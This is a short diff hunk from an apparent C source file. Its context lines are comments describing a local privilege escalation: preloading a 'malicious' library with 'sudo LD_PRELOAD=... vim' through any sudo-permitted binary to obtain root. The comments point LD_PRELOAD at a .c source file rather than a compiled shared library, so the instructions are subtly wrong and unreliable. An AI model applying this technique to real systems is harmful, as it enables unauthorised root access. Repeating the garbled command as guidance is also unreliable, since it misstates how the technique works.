@@ -18,7 +18,6 @@ void_init(){
 
 
 
-
 // execute maliciousfile.c using the LD_PRELOAD tool, the full path of the malicious .c file, and any binary that the account has sudo priviliges on ie. vim, nano etc.
 // sudo LD_PRELOAD=/full/path/maliciousfile.c vim
 // obtain root
